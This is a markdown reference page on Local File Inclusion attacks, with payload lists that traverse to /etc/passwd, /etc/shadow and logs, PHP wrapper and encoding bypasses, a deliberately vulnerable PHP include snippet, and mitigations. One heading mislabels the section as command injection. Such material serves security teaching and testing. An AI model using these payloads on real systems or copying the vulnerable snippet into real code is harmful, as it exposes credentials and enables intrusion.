# Attack Classes - LFI

Local File Inclusion (LFI) attack basically reads sensitive files, but can be paired with other techniques (XSS, Poisoning Logs) to make it a RCE (Remote Code Execution). 
LFI happens due to many applications dynamically loading files based on user input, from templates and images to configuration files and modules.

These user-supplied inputs can be:
- Query parameters
- Cookies
- Headers
- User-Agent header
- etc.

Local File Inclusion (LFI) is similar to Remote File Inclusion (RFI), the main difference between them is where the malicious file can reside: remotely or only on the local/current server. LFI can be compared to Path Traversal (Directory Traversal), an HTTP attack that allows attackers to access restricted directories and execute commands outside of the web server’s root directory


## Characteristics

These are the common characteristics that define a command injection attack.

- Attacker includes files like `/etc/passwd`, configuration files, logs, etc.
- Using PHP wrappers (e.g., `php://input`, `php://filter`) to bypass filters or encode payloads
- If the attacker can upload a malicious file (e.g., via file upload) and include it, they may execute arbitrary code
- Injecting PHP code into server logs

### Common Special Characters

These are the most common special characters used in Local File Inclusion attacks:

* `%00` - null byte
* `..` - Parent directory
* `%2e` - Percentage Encoding for (`.`)
* `%c0%ae` - Unicode Overlong Encoding for period (`.`)
* `%25` - Double Encoding for (`%`)
* `%2f` - Double Encoding for (`/`)
* `%5c` - URL-encoded ASCII code for the backslash character (`\`)
* `%23` - URL Encoded value for (`#`)

### Common Payloads

Here are some common Local File Inclusion payloads:
 
 **Linux**
 ```
/etc/passwd
/etc/shadow
/etc/nginx/nginx.conf
/proc/self/environ
/var/log/apache2/error.log
 ```

**Windows**
```
boot.ini
win.ini
\etc\hosts
/C:\Windows\php.ini
/C:\Program Files\Apache Group\Apache2\conf\httpd.conf
```

**PHP**
```
?page=../../../../etc/passwd  
?page=../../../../../../windows/win.ini  
?page=../../../../var/log/apache2/access.log  
?page=php://filter/convert.base64-encode/resource=index
?file=phar:///tmp/upload.phar/test.txt  
?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==  
?page=expect://ls
```

### Payload Examples

[MALICIOUS] *Vulnerable PHP Script*
```
<?php
$file = $_GET['file']; 
include($file);
?>
```

[MALICIOUS] *Vulnerable File Path*
```
http://vulnerable_host/preview.php?file=../../../../etc/passwd
```

[MALICIOUS] *Null Byte Injection*
```
http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
```

[MALICIOUS] *PHP ZIP Wrapper*
```
zip:///filename_path#internal_filename
```

### Obfuscation Techniques

| Special character | URL-encoded form | Purpose | Bypassed By |
|-------------------|------------------|---------|-------------|
| `.` (Period) | `%252e%252e` | Double encoding bypass | `../etc/passwd` |
| `#` (Fragment) | `%23` | PHP ZIP wrapper bypass | `zip:///filename_path#internal_filename` |
| `/` (Forward Slash) | `%2f` | Percentage encoding bypass | `..%2f../etc/passwd` |
| `%u` (Unicode) | `%u2215` | Unicode encoding bypass | `..%u2215boot.ini` |
| `%00` (Null character) | `%00` | Null byte/ Ignore | `%00/etc/passwd%00`|



### Mitigations

- Input Validation: Avoid passing user-submitted input to any filesystem/framework API. Application can maintain an allow list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected.
- Use Full Paths: - Avoid including files based on user input. Hardcode or securely map file paths.
- Disable Dangerous Functions: Restrict `include`, `require`, `fopen`, etc., where unnecessary. Disable remote URL includes (`allow_url_include=0`).
- Patch and Update: Regularly update web servers and application code
- Least Privilege: Restrict web server permissions to the minimum  needed.

**References:**

* https://www.pivotpointsecurity.com/file-inclusion-vulnerabilities/
* [Medium - Understanding Local File Inclusion (LFI): A Comprehensive Guide](https://medium.com/@subhash_pathak/understanding-local-file-inclusion-lfi-a-comprehensive-guide-eda3c20d5a7e))
* [Directory Traversal Attacks](https://www.acunetix.com/websitesecurity/directory-traversal/)
* [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Traversal.txt)
* [OWASP: LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
* [LFI Cheatsheet](https://www.vulnsy.com/cheat-sheets/lfi)